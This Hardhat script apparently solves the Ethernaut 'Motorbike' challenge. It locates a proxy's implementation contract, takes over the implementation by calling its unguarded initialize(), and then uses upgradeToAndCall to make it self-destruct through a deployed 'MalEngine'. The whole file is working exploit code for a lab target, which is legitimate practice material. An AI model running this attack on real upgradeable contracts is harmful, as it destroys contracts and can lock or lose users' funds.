import { ethers } from "hardhat";

async function motorbike() {
  const motorbikeAddress = "0xc261BC4A12b8a85694ff49002Eee1D6583d0AeDF";
  const implementationMemoryAddress =
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  const myAddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";

  const Motorbike = await ethers.getContractFactory("Motorbike");
  const motorbike = await Motorbike.attach(motorbikeAddress);
  console.log(`Motorbike attached to ${motorbikeAddress}`);

  // Find the engine address
  let engineAddress = "";
  await ethers.provider
    .getStorageAt(motorbikeAddress, implementationMemoryAddress)
    .then((result) => {
      engineAddress = "0x" + result.slice(-40);
    });

  console.log(`Engine address: ${engineAddress}`);

  // Attach to the engine
  const Engine = await ethers.getContractFactory("Engine");
  const engine = await Engine.attach(engineAddress);
  console.log(`Engine attached to ${engineAddress}`);

  // Make myself the upgrader
  const mySigner = await ethers.getSigner(myAddress);
  await engine.connect(mySigner).initialize();
  console.log(`Engine initialized, I'm the upgrader now!`);

  // Deploy the malicious engine
  const MalEngine = await ethers.getContractFactory("MalEngine");
  const malEngine = await MalEngine.deploy();
  await malEngine.deployed();
  console.log(`MalEngine deployed at ${malEngine.address}`);

  // Upgrade the engine
  const engineFromBike = await Engine.attach(motorbikeAddress);
  const destructCall = malEngine.interface.encodeFunctionData("destruct");

  await engine
    .connect(mySigner)
    .upgradeToAndCall(malEngine.address, destructCall);

  // Check if it worked
  console.log("Did it work?", await ethers.provider.getCode(engineAddress));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
motorbike().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
